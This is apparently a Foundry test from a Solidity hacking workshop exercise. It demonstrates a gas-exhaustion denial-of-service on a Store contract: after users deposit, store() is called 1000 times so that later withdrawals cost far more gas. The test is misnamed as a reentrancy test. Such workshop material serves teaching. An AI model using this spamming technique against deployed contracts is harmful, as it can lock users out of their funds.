// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Store} from "../src/SolidityHackingWorkshopV8.sol";

/**
DoS attack can be performed by spaming store() function 
it make the execution cost very high due to for loop
 */

contract Exercise1_Store is Test {
    Store public store;

    function setUp() public {
        store = new Store();
    }

    function test_ReentrancyBreach() public {
        address userA = vm.addr(1);
        address userB = vm.addr(2);

        vm.deal(userA, 2 ether);
        vm.deal(userB, 3 ether);
        vm.deal(address(this), 3 ether);

        // user a stores his money
        vm.startPrank(userA);
        store.store{value: 2 ether}();
        vm.stopPrank();

        // user b stores his money
        vm.startPrank(userB);
        store.store{value: 1 ether}();
        vm.stopPrank();

        console.log("gas used before spaming");
        vm.startPrank(userA);
        store.take();
        vm.stopPrank();

        for (uint i = 0; i < 1000; i++) {
            store.store();
        }

        console.log("gas used after spaming");
        vm.startPrank(userB);
        store.take();
    }
}
